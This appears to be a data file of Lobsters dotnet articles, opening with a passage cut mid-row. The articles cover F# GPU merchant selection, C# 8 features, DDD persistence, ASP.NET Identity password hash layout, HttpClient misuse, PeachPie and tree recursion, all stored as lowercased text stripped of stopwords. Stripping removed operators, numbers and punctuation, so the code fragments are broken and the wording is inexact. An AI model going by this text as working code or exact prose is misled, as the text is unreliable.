allocationiteratoriterate supply numretailskus f reduction memory use provided int encoding important full search since must enumerate possible allocation using encoded allocation significantly increase capability full search algorithm regard level cart complexity algorithm handle pricefulfillmentnode price set offer fulfilled fulfillment node fnid update various aspect order total order price total weight shipping cost let pricefulfillmentnode fnid fulfillmentnode fulfillmentnode shippingrules int shippingrule commissionrules int commissionrule loopoffers int offer sku unit unit let mutable orderprice let mutable numskuspriced let order ref order let ordersums ref ordersums let updateordersums updateordersums ordersums let updateshippingcost updateshippingcost shippingrules ordersums order let updateofferprice updateofferprice commissionrules ordersums order loopoffers fnid updateordersums ordersumscontentslinescount numskuspriced ordersumscontentslinescount updateshippingcost fulfillmentnode loopoffers fnid updateofferprice fulfillmentnode let order order orderprice ordertotalnetprice ordertotalshipping ordercommission orderprice numskuspriced microservice layer high level jetcom microservices simple executables listen route http request translate body json f record containing data necessary perform merchant selection operation microservices reference pricing engine library use accordingly addition testing core performance gpu algorithm also needed address gpu microservice would handle high load request received gpu done previous calculation solution us blockingcollection size systemcollectionsconcurrent tryadd member attempt add element collection within specified wait time second wait time let private maxwaittime collection size element added add blocked element removed let requestqueue new blockingcollection let cheapestallocation match pricingalgorithm gpufullsearch pricingalgorithmgpugenetic try second add new request requestqueuetryadd merchantselectionrequest maxwaittime try let result pricingalgorithminvoke pr result remove request collection process next one requestqueuetake ignore success result exn requestqueuetake ignore failure exn else unable add new request collection within second fail gpu busy message failure new exception gpu busy cpu algorithm blocked pricingalgorithminvoke pr success simple solution work well due improved performance medium largesize cart one azure nseries gpu machine able handle request load multiple azure cpuonly instance conclusion gpuaccelerated fulfillment f cloud post introduced jetcom exponentially complex merchant selection problem approach solving within environment microservices written f running azure cloud covered implementation detail brute force gpu search approach merchant selection algorithm used restful microservice future post hope expand genetic algorithm approach validated compared multiple algorithm production data different way used ai machine learning improve performance pricing engine like learn gpurelated work going jetcom sure check two gtc presentation given daniel egloff price drop shop walmart using jet gpubased smart merchant selection gain competitive advantage pdf welcome jet age ai deep learning make online shopping smarter walmart pdf check jet technology blog learn jetcom problem working feel free reach directly comment acknowledgement would like thank daniel egloff neerav kothari xiang zhang andrew shaeffer work would possible without
325,Lobsters,dotnet,"C#, F#, .NET programming",C# 8.0 Features: A Glimpse of the Future,https://blog.ndepend.com/c-8-0-features-glimpse-future/,c feature glimpse future,extension everything default implementation interface nullable reference type want make sure staying current good development practice c language evolves download ndepend trial free extension everything extension method let see c code current status default implementation interface immutable use case interface become abstract class current status nullable reference type null reference coined null bad enough talking let see c code preventing assignment nullable nonnullable backward compatibility current status download c future look awesome additional reading carlosschultsnet,almost year since microsoft released first version c language unjustly deemed mere java upcoming release c language remarkable evolution nowadays frequently featured used loved programming language list use develop desktop web mobile apps write code run major operating system jump right onto iot bandwagon write code smarten house live interesting time c developer indeed present already exciting future would possible u get glimpse lie ahead language course microsoft developed c open quite take look github repo read discussion proposal today selected three feature proposal c talk extension everything default implementation interface nullable reference type want make sure staying current good development practice c language evolves download ndepend trial free get grade codebase technical debt extension everything extension everything probably least controversial three feature proposal certain way least fleshed also figured make good starting point probably familiar extension method introduced c totally possible abused denying extension method used wisely awesome addition c developer mention essential linq point may wondered though extension method alone extension property instance desire c developer quite long time evidenced stack overflow question seems wait finally coming end according mads torgersen program manager c design team microsoft intern proposed new syntax extension method also allow extension thing let see c code well itching see code example extension method using current syntax public static class intextensions public static bool even int value return value nothing surprising right original syntax extension method static method static class keyword first parameter thing syntax work method really could otherwise since would first parameter property come extension everything proposal suggests new type declaration called extension public extension intextension extends int public bool even code example date writing c team yet settle syntax regardless example show creation extension class extends int declare property normally done caller code would able use property normally int x intparse consolereadline xeven consolewriteline typed even number new feature meant support method property operator static member least beginning event constructor may come later able add additional state original instance ie creating private field extension class according torgersen would add undesirable complexity order keep track new state current status follow feature development github issue default implementation interface admit exactly first heard default implementation interface talk mads torgersen gave may build conference record type thought immutable object really getting implementation interface safely guess feature name able add method implementation interface instance interface idisplayservice void displaymessage string message writeline message c code would perfectly legal class implementing interface need implement method implementation interface decides default implementation fit need provide implementation besides method also allowed add body indexer property event accessors static member method property indexer allowed well instance state allowed interface though able use static field instance field consequence autoimplement property allowed well since automatically declare hidden backingfield use case stated feature proposal primary use case default interface method enable developer safely evolve interface could add new method long provided default implementation existing client interface forced implement currently could solve problem extension method approach limited though wanted provide specialized version method one implementation good luck default implementation shine another important value proposition default implementation interface relates android io since java swift offer feature tricky use c wrap androidios apis make use c make possible wrap apis faithfully interface become abstract class sort really know multiple inheritance language like c java mean inherit one class hand class continue able implement several interface current status feature currently prototyped follow development github issue nullable reference type may wondering nonnullable reference type name feature bit confusing indeed get back soon first let address even thing bet familiar phrase billion dollar mistake offchance phrase refers null reference coined none sir tony hoare inventor null reference null bad ndepend help see issue code around issue like immutability code smell visibility nullable type figure interesting implication code could make several argument biggest problem course risk getting infamous nullreference exception aka nullpointer exception javaland since everything everything context c meaning reference type null always run risk getting exception try access member object one biggest issue language lack syntax would allow author express intent possible say parameter never null property may null sometimes ok common functional language deal type represents concept potential absent value often called maybe option c team decided something like since according adding new kind null language probably make thing complex let go back naming issue may thinking got backwards make sense talk nullable value type since value type nonnullable default case reference type right nullable beginning catch c design move free make nonnullability new default reference type sense new thing would nullable type keep language consistent propose use syntax already exists nullable reference word question mark enough talking let see c code suppose using infamous person class example software equivalent playing stairway heaven musical instrument may little overdone using elaborate example would distracting unnecessary please bear suppose person class age property type int write following method public int calculatesquareofage person p int age page return age age even though code gladly compile fragile since p could null probably add statement account possibility one make completely free leave code c promise change making reference type nonnullable default example trying access age property would safe since p would never null wanted p nullable add question mark type mentioned public int calculatesquareofage person p int age page return age age p null trying access age safe anymore get warning want get rid warning hopefully already today perform null check public int calculatesquareofage person p var result p null result page page return result way flow analysis performed assignment line reached compiler know fact p possibly null leave alone another possibility public int calculatesquareofage person p int age p age return age age short several option soon convince compiler code offer risk throwing null reference exception warning go away preventing assignment nullable nonnullable c also prevent assigning nullable variable nonnullable code result warning well string nullablestring hello string nonnullablestring nullablestring feature come along new operator called nullignoring operator basically use operator tell compiler developer know best situation variable possibly null compiler able infer one example would use stringisnullorempty method public void foo string bar barisnullorempty var length barlength code generate warning despite possible bar null operator come handy public void foo string bar barisnullorempty var length bar length keep mind using operator basically telling compiler trust know better really know backward compatibility know probably thinking sound nice change break lot existing code well course would optin change activated perproject basis current status one already prototyped interested download install test preview nullable reference type right away previous feature stay tuned following relevant proposal github c future look awesome know bit three feature probably getting next major version c language see evolving language hard work language remain compatible million billion line code written last year time order continue relevant must meet need developer facing challenge unimaginable year ago must without losing essence easy approachable objectoriented clike language additional reading enjoying treatment c feature check two additional post addressing additional feature contributing author carlos schults net software developer experience desktop web development trying hand mobile passion writing clean concise code interested practice help improve app health code review automated testing continuous build read carlos carlosschultsnet
326,Lobsters,dotnet,"C#, F#, .NET programming",DDD Persistence: Recorded Event-Driven Persistence,https://www.erikheemskerk.nl/ddd-persistence-recorded-event-driven-persistence/,ddd persistence recorded eventdriven persistence,full blog article interface pattern enterprise application architecture catalog antipattern yessql order aggregate persist thing persisting value type event contract persisting event benchmarkdotnet gist advantage disadvantage advantage event sourcing disadvantage immutable correcting choosing different conclusion,decide implement business logic applying ddd one thing run save change internet full blog article mythical ddd repository offer interface actually implement interface first let take look interface repository look like first repository actually per martin fowler pattern enterprise application architecture catalog repository mediates domain data mapping layer using collectionlike interface accessing domain object alright least method accessing entire collection probably make sense able single one item already know unique identifier let get supergeneric repository say domain model unique identifier truly unique guid domain going pretty simple one placing modifying order public interface iorderrepository ienumerable order getall order getbyid guid orderid right take care reading course also able create update delete order wait sound much like crud like currently ivory ddd tower able modify collection order much better public interface iorderrepository ienumerable order getall order getbyid guid orderid void add order order void update order order void remove order order nicely sidestepped crud antipattern using different verb mostly repository method great yessql let go implementing interface fine say spin mongodb instance implement getall retrieving entire collection builder order oorderid orderid add update remove basically map respectively uh oh architect look happy whoa fast already paying nose bigass oracle cluster sitting waiting used like store data oracle please turn page bible coding guideline set forth enterprise architect notice allowed store document table run daily report business intelligence cube json table schema proper please alright oracle order aggregate point probably take look domain model order really let ask business analyst well mvp order really simple customer shipping information primarily address price stuff oh order line able modify order finally send fulfilled sake example let get discussion order line order line simply product number sku quantity peritem price something like public class order public guid orderid get public address shippingaddress get public customer customer get public decimal totalpriceincludingvat get public decimal totalpriceexcludingvat get public ireadonlycollection orderline orderlines get public bool isreadyforfulfillment get private set public class orderline public string sku get public int quantity get private set public decimal peritempriceincludingvat get look easy enough operation able create new order obviously add remove order line update order line quantity finally send order fulfillment something like public class order rest class omitted brevity public static order createnew address shippingaddress customer customer public void addorderline string sku int quantity decimal peritempriceincludingvat public void removeorderline string sku public void changeorderlinequantity string sku int quantity public void fulfill implementation operation omitted brevity imagine would like example would look order line provided sku modify quantity property persist thing persist oracle database let first take look orchestrating code use case look like specifically want look use case adding order line start get interesting public void addorderline guid orderid string sku int quantity var order orderrepositorygetbyid orderid var peritemprice productrepositorygetbysku sku priceincludingvat orderaddorderline sku quantity peritemprice orderrepositoryupdate order database schema well pretty straightforward order table contains order orderline table contains order line orderline foreign key reference back order table keep thing nice consistent create table order orderid raw primary key null shippingaddress varchar null customeremail varchar null ready char null totalpriceincvat number null create table orderline orderid raw null sku varchar null quantity int null priceincvat number null constraint orderlinepk primary key orderid sku constraint orderlineorderfk foreign key orderid reference order orderid implementing creating deleting order pretty much selfexplanatory let try implement challenge updating order fairly easy something like public void update order order connectionexecute update order set shippingaddress shippingaddress customeremail customeremail ready ready totalpriceincvat totalpriceincvat orderid orderid new shippingaddress ordershippingaddresstostring customeremail ordercustomeremailaddress ready orderisreadyforfulfillment n totalpriceincvat ordertotalpriceincludingvat orderid orderorderidtobytearray done order line foreach var line know state order line know order line new existing existing one modified unmodified clean dirty could iterate see already exist database either insert update yuck elegant scale well order hundred thousand line heavy load system another solution would sneak extra property domain model keep track thing add order order line model deletion could introduce property order order line present problem use property indicate deleted careful include deleted line business logic involved current order line order checking already order line particular sku could introduce separate collection order line deleted delete order line add repository see quickly get hand addition thing business care let try keep domain model clean repository keep track entity associated object return orm framework mean deal increased memory usage processing time take keep process additional state orm usually work capturing state object returned caller saving comparing difference really kind bruteforce approach also pick configure wire orm framework difficult get right even something ubiquitous entity framework write one incredibly difficult get right let try different approach persisting value type one solution modify domain model bit instead returning void operation return value object describing change modify repository interface single method kind change yes could work also benefit making explicitly clear new operation yet implemented repository interface method yet operation domain model would look something like public class order rest class omitted brevity public static order createnew address shippingaddress customer customer public orderlineadded addorderline string sku int quantity decimal peritempriceincludingvat public orderlineremoved removeorderline string sku public orderlinequantitychanged changeorderlinequantity string sku int quantity public orderfulfillmentrequested fulfill note still return order creating new order ambiguity everything new also note type name value object returned formulated like event et cetera describe thing already happened could also think explicit delta difference state order two point time next let modify repository interface make work public interface iorderrepository ienumerable order getall order getbyid guid orderid void add order order void store orderlineadded event void store orderlineremoved event void store orderlinequantitychanged event void store orderfulfillmentrequested event void remove order order implementation almost writes brevity spell able imagine would look like problem however initial version interface ideal want persist data nosql database simply serialize object graph write database done second version interface value type ideal want persist data rdbms event run sql query get data right state pretty cumbersome storage mechanism nosql database choosing one interface pattern pretty much lock application associated storage mechanism define new method repository interface operation application support expose flaw perpendicular one benefit interface contract extend interface adding new operation broken contract implementation need modified violates openclosed principle persisting event solve conundrum driving persistence based event seems like good idea avoid openclosed principle violation let use angle basis solution let go back single save method public interface iorderrepository ienumerable order getall order getbyid guid orderid void store ienumerable ievent event least interface much cleaner note well condensing store method one method add remove method also removed add new order event remove order also event store method accepts collection ievent marker interface make explicit kind object accept design still problem though interface accepts collection event use case service whatever want call collect list event performing operation order use case job also decide use nosql database want store serialized version order let refine public interface iorderrepository ienumerable order getall order getbyid guid orderid void store order order better truly matter kind persistence mechanism want use use case stay truly ignorant fact collecting event aggregate root operation return void addition modifying aggregate root state adding event list event yet persisted internals look like going focus single use case changing order line quantity first let look order orderline class public class order public void changeorderlinequantity string sku int quantity var orderline orderlinesfirst l lsku sku orderlinechangequantity quantity eventspendingpersistenceadd new orderlinequantitychanged orderid orderid sku sku quantity quantity public ireadonlycollection ievent dequeueallevents var event eventspendingpersistencetolist eventspendingpersistenceclear return event public ireadonlycollection orderline orderlines orderlines private readonly list orderline orderlines new list orderline private readonly list ievent eventspendingpersistence new list ievent public class orderline internal void changequantity int quantity quantity quantity public int quantity get private set method provides repository access event yet persisted called dequeue return event queue empty queue implemented using list rather queue need random access one time operation expose use case code trivially simple get order operate store public void changeorderlinequantity guid orderid string sku int quantity var order orderrepositorygetbyid orderid orderchangeorderlinequantity sku quantity orderrepositorystore order repository code get order us get event dynamically dispatch class orderrepository iorderrepository public ienumerable order getall implemented brevity public order getbyid guid orderid implemented brevity public void store order order var event orderdequeueallevents dispatchallevents event private void dispatchallevents ireadonlycollection ievent event foreach var event event dispatchevent event private void dispatchevent ievent event handle dynamic event private void handle orderlinequantitychanged event connectionexecute update orderline set quantity quantity orderid orderid sku sku new orderid eventorderidtobytearray eventsku eventquantity pretty straightforward method something peculiar cast event dynamic straightforward approach dispatching event also happens fastest one let briefly dig statement ran benchmark using benchmarkdotnet comparing various method dispatching event using dynamic using reflection using lambda using pattern matching result course pattern matching using switch statement fastest option around n per invocation net core followed closely dynamic around n per invocation reflection prewarmed cache lot slower around n per invocation expected reflection slow pleasantly surprised lightningquick dynamic especially net core mind still talking nanosecond nanosecond one millionth second reference benchmark code found gist easily see class far smallest easiest read performancerelated reason advantage disadvantage established eventdriven persistence pattern let look advantage disadvantage advantage allows easy implementation repository different persistence mechanism documentbased relational database event sourcing easy implement even going event sourcing still want store broadcast publish event application basically get free implementing persistence relational database exceedingly easy without rely orm framework one method persistence even creation deletion represented event compared persist value object domain model pattern transaction management remain inside persistence layer rather managed orchestrating code domain model remain clean persistencerelated artifact disadvantage depending complexity domain model going model lot event pattern matching give static type safety hand even pattern matching want test whether particular type event supported code write test event type anyway one important characteristic keep mind modeling event domain model raise event thing happened past since change past immutable saying implement persistence using event sourcing expose event outside world becomes must mean must design event like class orderlineaddedevent public orderline neworderline get look immutable might say yes part domain model almost definitively mutable make entire event mutable mean time handle serialize event state instance put might changed created event mean lost information might bad persisting current state event sourcing exposing event outside world make event lose value instead design event like class orderlineaddedevent public string sku get public int quantity get public decimal peritempriceincludingvat get also think granular want event coarse like raise every change order difficult extract changed event whole point exercise finegrained like get explosion event corresponding handle method lot traffic database want capture intent somebody change house number shipping address order either correcting shipping address choosing different shipping address might able capture distinction ui use case least becomes apparent change address whole conclusion sorry long post subject matter unfortunately simple pattern let name recorded eventdriven persistence simple elegant allows persist complex domain model without persistence code becoming total spaghetti think improved let know also already named pattern think better name recorded eventdriven persistence let know
328,Lobsters,dotnet,"C#, F#, .NET programming",Anatomy of an ASP.NET Identity PasswordHash,http://www.blinkingcaret.com/2017/11/29/asp-net-identity-passwordhash/,anatomy aspnet identity passwordhash,thing wanted know storing password afraid ask email protected really email protected passwordhash breakdown custom passwordhasher configuration generating hash without aspnet identity password based key derivation function thing wanted know storing password afraid ask microsoftaspnetcorecryptographykeyderivation value type manual validation big endian passwordhasher sample project,ever looked user record aspnet identity user table wondered saved passwordhash column look like apart maybe satisfying curiosity could benefit knowing exactly seemingly random sequence character well could confidently update different version aspnet identity also ever get tired aspnet identity whatever reason could move user account whatever alternative found might better want simple user table deal need know make aspnet identity work still able move user account aspnet identity day choose whatever reason may let pause think first make good stored password first password know person hold account look saved passwordhash column seems true tell password entered generate passwordhash able guess becomes public somehow eg server host database password hash stored breached attacker able much might try guess good password able reasonable amount time case salt used know salt context recommend article thing wanted know storing password afraid ask case hurry summary random piece data combined password make impossible attacker generate hash common password store use compare password hash example imagine email protected qwerty common password really attacker know algorithm used hash user password compute hash email protected hash qwerty store process figuring password used generate particular password hash becomes exercise searching match stored password much faster password hash picking possible password generating hash seeing match using salt password look unique example instead querty hash quertyg save hash quertyg salt g user table aspnet identity passwordhash column salt column mean salt used fortunately salt used fact much password hash passwordhash column way referring content passwordhash column password hash however store several value closest one hash result algorithm even really hash common call hash well also guilty common refer hash though hopefully read along clear thing inside passwordhash shortcoming part make thing confusing passwordhash breakdown even though passwordhash one column contains information version aspnet identity used salt information pseudo random function prf used hashed password convert representation byte array using get following configuration byte value indicate password hash identity version value indicate version version identity first byte get following byte random salt stored byte password hash stored latest version identity first byte get following byte unsigned int contain value enumeration microsoftaspnetcorecryptographykeyderivationkeyderviationprf byte unsigned int store salt size always byte random salt stored byte contain hashed password latest version identity possible specify number iteration apply configuration version number fixed important know unsigned ints stored stored backwards let explain unsigned int byte long convert one byte using bitconverter example byte unsignedintasbytearray bitconvertergetbytes uint look print byte sequence bit order byte leftmost sequence eight bit byte rightmost rightmost bit first byte represents least significant bit ie one left etc first bit second set bit second byte represents one left one etc easy read way confirm summing uints stored way stored reverse order ie original byte byte byte byte etc important know creating byte array go passwordhash order uints way valid custom passwordhasher configuration class aspnet identity responsible generating validating password called passwordhasher source code available github one thing reasonable assume look format saved hash seems number iteration perform salt size particular prf function use configurable unfortunately case configure version want use number iteration perform furthermore number iteration taken account select selected value ignored configure aspnet core web application us aspnet identity set use startupcs configureservices method public void configureservices iservicecollection service servicesconfigure passwordhasheroptions option optionscompatibilitymode optionsiterationcount value ignored use use specify iterationcount public void configureservices iservicecollection service servicesconfigure passwordhasheroptions option optionscompatibilitymode optionsiterationcount value used use option select prf function use etc change salt size prf function generating hash without aspnet identity imagine want able generate password hash without use aspnet identity maybe like database structure aspnet identity creates aspnetsomething table maybe building web site user need account latter went recently right sidebar bottom mobile website archive widget showing past blog post widget powered aspnet core website one user login addedit show archive want deal configuring aspnet identity one user also found idea able set admin user password configuration appealing another strong motivation go look passwordhasher see method generating passwordhash named hashpassword take parameter instance tuser tuser used method fact tuser generic parameter passwordhasher class used anywhere class want reuse passwordhasher pas tuser awkward necessary furthermore pick prf salt size different even though code validate password deal prfs salt size let first describe generate password hash hand process similar first thing need know generate salt net core using randomnumbergenerator find systemsecuritycryptography namespace example generate bit byte salt using var rng randomnumbergeneratorcreate var salt new byte rnggetbytes salt getmethod fill salt array random data create method give instance randomnumbergenerator appropriate specific platform running window linux mac thing need know use password based key derivation function want understand used shamelessly recommend reading thing wanted know storing password afraid ask get implementation need install microsoftaspnetcorecryptographykeyderivation nuget package dotnet add package microsoftaspnetcorecryptographykeyderivation even though nuget package aspnetcore name depend aspnet run net core console application generate password hash using password cutecats using microsoftaspnetcorecryptographykeyderivation var password cutecats salt salt prf iterationcount numbytesrequested using default aspnet identity us byte salt iteration byte hash numbytesrequested everything need generate valid aspnet identity passwordhash thing need put everything together byte byte need byte long let create one var new byte keyderivationprf value iteration count salt size salt password hash size first byte version marker next byte uint contains int value enumeration keyderivationprf value uint prf uint byte prfasbytearray bitconvertergetbytes prf reverse toarray need systemlinq work bufferblockcopy prfasbytearray bitconvertergetbytes get byte array value type like uint call reverse convert ienumerable reverse return back array use bufferblockcopy copy uint array array signature blockcopy source array source offset destination array destination offset number byte copy next byte contain iteration count default let use example byte iterationcountasbytearray bitconvertergetbytes uint reverse toarray bufferblockcopy iterationcountasbytearray similar story salt size actually use different value larger validated correctly although way configuration byte saltsizeinbytearray bitconvertergetbytes uint reverse toarray bufferblockcopy saltsizeinbytearray need copy salt generated earlier bufferblockcopy salt saltlength finally actual hash bufferblockcopy saltlength convert base ready use var open aspnet identity aspnetusers table least one user put able log user password cutecats manual validation generate valid aspnet identity passwordhashes need able validate ie given password verify right password passwordhash process go like convert passwordhash byte extract pseudo random function used value keyderivationprf enumeration number iteration salt actual hash recompute hash using input password compare stored hash equal password correct let step step imagine passwordhash string stored passwordhash get byte need var passwordhash next step get keyderviationprf enumeration value need convert consecutive byte position position array make uint saved previously remember byte reverse order need reverse back original order use method expects byte startindex array read byte make uint let put method called convertfromnetwororder private static uint convertfromnetwororder byte reverseduint return reverseduintreverse toarray reason networkorder name method describes order byte byte array significant come first another way refer way ordering bit big endian use convertfromnetwororder fetch prf uints stored var prfasarray new byte bufferblockcopy prfasarray var prf keyderivationprf convertfromnetwororder prfasarray iteration count var iterationcountasarray new byte bufferblockcopy iterationcountasarray var iterationcount int convertfromnetwororder iterationcountasarray next salt size even though always use aspnet identity verifying password salt size generating passwordhash aspnet identity option specifying different size salt see method passwordhasher class var saltsizeasarray new byte bufferblockcopy saltsizeasarray var saltsize int convertfromnetwororder saltsizeasarray int bufferblockcopy expects int offset parameter actual salt var salt new byte saltsize bufferblockcopy salt saltsize finally saved hash var savedhashedpassword new byte saltsize bufferblockcopy saltsize savedhashedpassword savedhashedpasswordlength thing need run saved prf function iteration count salt var hashfrominputpassword password salt prf iterationcount compare saved hash one generated input password proper way way disclose information different two array compare position position stop soon different attacker time time take password fail adjust attempt accordingly sound convoluted simpler example time take perform operation discloses information imagine website someone enters invalid username password even tested even message get sent back invalid usernamepassword combination disclose username invalid attacker time response validate username valid fact message invalid usernamepassword combination take longer come back response username exists therefore good idea make check take amount time case comparing array make sure every position tested every time even necessary decide array different private static bool arebytearraysequal byte byte return false var areequal true var areequal return areequal finally password valid arebytearraysequal hashfrominputpassword savedhashedpassword return true sample project sample project generate passwordhash aspnet identity console application example used hash cutecats hash long password verify passwordpasswordhash verify cutecats password correct verify cutecatz wrong password get project github git clone http related
329,Lobsters,dotnet,"C#, F#, .NET programming",You're using HttpClient wrong and it is destabilizing your software,https://aspnetmonsters.com/2016/08/2016-08-27-httpclientwrong/,using httpclient wrong destabilizing software,rub official doc aspnet site agreement well reentrant see http aspnetmonsterscom wait http fix harald ulrksen darrel miller pattern practice document wrapping,using httpclient wrong year finally came back bite site unstable client furious simple fix performance improved greatly instability disapeared time actually improved performance application efficient socket usage microservices bear deal service added monolith broken tends communication path service many option communicating http ever popular option microservies built c net language chance made use httpclient know typical usage pattern looked little bit like using var client new httpclient rubthe using statement c nicity dealing disposable object using block complete disposable object case httpclient go scope disposed dispose method called whatever resource use cleaned typical pattern net use everything database connection stream writer really object external resource must clean us idisposable interface blamed wanting wrap using first considered good practice fact official doc using state rule use idisposable object declare instantiate using statement secondly code may seen inception httpclient would told use using statement block including recent doc aspnet site internet generally agreement well httpclient different although implement idisposable interface actually shared object mean cover reentrant thread safe instead creating new instance httpclient execution share single instance httpclient entire lifetime application look see yourselfhere simple program written demonstrate use httpclient using system using systemnethttp namespace consoleapplication public class program public static async task main string args consolewriteline starting connection int using var client new httpclient var result await clientgetasync http aspnetmonsterscom consolewriteline resultstatuscode consolewriteline connection done open request one best site internet http aspnetmonsterscom get print status code know working output going c codesocket dotnet runproject socket netcoreapp compiled input modifiedcompiling socket netcoreapp succeeded warning error time elapsed connectionsokokokokokokokokokokconnections done wait work everything right world except pull netstat tool look state socket machine running see c codesocket netstatexe proto local address foreign address state tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp http timewait tcp established huh application exited yet still bunch connection open azure machine host aspnet monster website timewait state mean connection closed one side still waiting see additional packet come might delayed network somewhere diagram tcpip state stole http window hold connection state second set hkeylocalmachinesystemcurrentcontrolsetservicestcpipparameterstcptimedwaitdelay limit quickly window open new socket exhaust connection pool likely see error like unable connect remote serversystemnetsocketssocketexception one usage socket address protocolnetwork addressport normally permitted searching google give terrible advice decreasing connection timeout fact decreasing timeout lead detrimental consequence application properly use httpclient similar construct run server need understand mean fix underlying problem instead tinkering machine level variable fix ini really must thank harald ulrksen darrel miller pointing pattern practice document share single instance httpclient reduce waste socket reusing using system using systemnethttp namespace consoleapplication public class program private static httpclient client new httpclient public static async task main string args consolewriteline starting connection int var result await clientgetasync http aspnetmonsterscom consolewriteline resultstatuscode consolewriteline connection done consolereadline note one instance httpclient shared entire application eveything still work like use actually little faster due socket reuse netstat show tcp http established production scenario number socket averaging around peak would exceed effectively crushing available resource server caused service fall implementing change socket use dropped average consistently le usually around chunk graph monitoring tool show happened deployed limited proof fix select number microservices dramatic kind load need remember two thing make httpclient static dispose wrap httpclient using unless explicitly looking particular behaviour causing service fail wrapping upthe socket exhaustion problem struggling month disapeared client threw virtual parade understate unobvious bug year conditioned dispose object implement idisposable many refactoring tool like r coderush actually warn case disposing httpclient wrong thing unfortunate httpclient implement idisposable encourages wrong behaviour
330,Lobsters,dotnet,"C#, F#, .NET programming",FSharp Weekly #48 - Domain Modeling Made Functional,https://sergeytihon.com/2017/11/25/f-weekly-48-domain-modeling-made-functional/,fsharp weekly domain modeling made functional,news video slide blog f vnext open source project rewrap shed spisemisuminecraft new release like,welcome f weekly roundup f content past week news video slide blog f vnext open source project rewrap rewrap extension vscode visual studio shed net runtine inspector spisemisuminecraft minecraft client written entirely fsharp new release great week previous f weekly edition like like loading related
331,Lobsters,dotnet,"C#, F#, .NET programming",PHP on .NET Standard 2.0,https://www.peachpie.io/2017/11/php-netstandard-2-0.html,php net standard,recap today php net standard august announcement blog net standard right announcement news net net core net core net standard announcement c compiler netstandard peachpie performance php,hearing peachpie first time title article may seem even crazier others happy announce project allows compile php code directly net standard number outrageous consequence recap peachpie modern secondgeneration compiler runtime php code net net core framework run entirely safe managed code objective fully compatible regular php offering variety advantage thanks net platform performance enhancement bidirectional interoperability c php today compilation peachpie ran net core allow compiling without version installed problem feature work several user struggled set thing php net standard starting peachpie version net core newer installed compile php code net standard also reference package targeting mean peachpie produce dll file legacy php source code allowing port code modern platform net ecosystem result reference library example net project written c additionally net core brings substantial performance increase peachpiecompiled php code benefit significantly implication net standard significant first foremost microsoft increased number available apis net standard around immo landwerth state august announcement blog net standard addition make much easier port existing code net standard extension net implementation net standard net core upcoming version uwp course also valid php application compiled peachpie peachpie make php firstclass citizen net ecosystem php apps also benefit wideranging platform support net standard offer right following platform currently supported net framework net core mono xamarinios xamarinmac xamarinandroid upcoming version uwp expected ship later year information tutorial consume create net standard library much definitely suggest referring immo blog post posted november category announcement news tag net net core net core net standard announcement c compiler netstandard peachpie performance php
333,Lobsters,dotnet,"C#, F#, .NET programming",Recursion Without Recursion,https://www.benjamin.pizza/posts/2017-11-13-recursion-without-recursion.html,recursion without recursion,stack overflow job asts operation easier querying reusable transformer pattern library sawmill nuget github haskell library modernised port accompanying article,posted november visit stack overflow job see job search form support simple advanced search syntax including boolean operator number custom filter technology tag minimum salary example hate writing javascript loyalty bought might type c javascript search box advanced search syntax called jql job query language come surprise codebase contains miniature compiler miniature query language compiler look much like compiler parser produce abstract syntax tree hereafter ast pipeline analyser transformation operate ast code generator turn jql elasticsearch query actually query simple enough end skipping elastic code generation step instead used interpreter search inmemory cache job post going focus middle part pipeline write operation traversing tree minimum boilerplate asts operation jql ast look roughly like abstract class jqlnode class andnode jqlnode public jqlnode left get public jqlnode right get class ornode jqlnode public jqlnode left get public jqlnode right get class notnode jqlnode public jqlnode operand get class salarynode jqlnode public int amount get public string currency get class tagnode jqlnode public string tag get syntactic form source language represented subclass jqlnode using example gave input string c javascript would represented new andnode new tagnode c new ornode new notnode new tagnode javascript new salarynode gbp need analyse jqlnode use pattern matching see type node recursively query operand andornot node function search tagnodes tree ienumerable string extracttags jqlnode node switch node case tagnode return new ttag case andnode recursively extract tag two operand return extracttags aleft concat extracttags aright case ornode return extracttags oleft concat extracttags oright case notnode n return extracttags noperand case salarynode return enumerableempty string default throw new argumentoutofrangeexception nameof node transforming jqlnode produce new jqlnode similar story recursively traverse tree taking apart putting back together example optimisation step never remove doublenegatives query like java get simplified java jqlnode simplifydoublenegatives jqlnode node switch node case notnode notnode return simplifydoublenegatives case tagnode return case salarynode return case andnode recursively process operand rebuild node return new andnode simplifydoublenegatives aleft simplifydoublenegatives aright case ornode return new ornode simplifydoublenegatives oleft simplifydoublenegatives oright case notnode n return new notnode simplifydoublenegatives noperand default throw new argumentoutofrangeexception nameof node type code get pretty tedious pretty quickly function one case interesting case tagnode extracttags case notnode notnode simplifydoublenegatives rest function boilerplate recursively operate node child interested particular syntactic pattern searching whole tree pattern requires code finding pattern real jql compiler dozen subclass jqlnode around code operation boilerplate easier querying first insight help u improve situation extracttags searching tree node satisfying particular pattern supposing list every possible subtree root node child child could use linq query list find node satisfying pattern looking call function extract list subtrees selfanddescendants given tree like example c javascript selfanddescendants yield every subtree depthfirst lefttoright manner new jqlnode new andnode new tagnode c new ornode new notnode new tagnode javascript new salarynode gbp new tagnode c new ornode new notnode new tagnode javascript new salarynode gbp new notnode new tagnode javascript new tagnode javascript new salarynode gbp selfanddescendants use ienumerable string extracttags jqlnode node node selfanddescendants oftype tagnode select n ntag improvement code much shorter importantly clearer direct directly read intention code rather decipher pattern recursive call also harder get wrong personally rather prone forgetting make recursive call writing sort function selfanddescendants totally reusable write linq query get whatever information need jqlnode course patternmatching recursion go somewhere somewhere reusable selfanddescendants function public static ienumerable jqlnode selfanddescendants jqlnode node yield return node switch node case tagnode yield break case salarynode yield break case andnode foreach var descendant selfanddescendants aleft yield return descendant foreach var descendant selfanddescendants aright yield return descendant case ornode foreach var descendant selfanddescendants oleft yield return descendant foreach var descendant selfanddescendants oright yield return descendant case notnode n foreach var descendant selfanddescendants noperand yield return descendant default throw new argumentoutofrangeexception nameof node google crawl link page search web specific piece information selfanddescendants crawl pointer node search tree specific piece information programming tree traversal hand like manually clicking every link web reusable transformer transforming jql ast simplifydoublenegatives search jql tree pattern rebuilds new version tree extracted reusable function rewrite tree search tree node satisfying pattern looking replace selfanddescendants trick separate responsibility looking every node tree deciding whether replace given node write higherorder function let call rewrite applies func every node jql tree bottom top func job decide node example rewrite take query c javascript function transformer compute expression transformer new andnode transformer new tagnode c transformer new ornode transformer new notnode transformer new tagnode javascript transformer new salarynode gbp transformer get applied every subtree exactly rewrite mapping operation like linq select implemented static jqlnode rewrite jqlnode node func jqlnode jqlnode 